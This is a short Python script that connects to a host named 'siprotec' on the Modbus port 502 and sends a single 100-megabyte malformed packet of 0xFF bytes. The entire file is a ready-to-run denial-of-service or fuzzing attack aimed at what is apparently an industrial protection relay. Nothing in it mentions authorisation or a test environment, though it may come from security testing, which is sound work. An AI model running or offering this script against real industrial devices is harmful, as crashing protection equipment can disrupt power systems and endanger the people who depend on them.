# Send one huge packet
# size can be customized

import socket

# Server info
server_ip = "siprotec"
server_port = 502

# other vars
packet_size = 100000000

# Create a socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Modbus server
sock.connect((server_ip, server_port))

# Generate a malformed Modbus-like packet with all bytes set to 0xFF
malformed_packet = bytes([0xFF] * packet_size)

sock.send(malformed_packet)
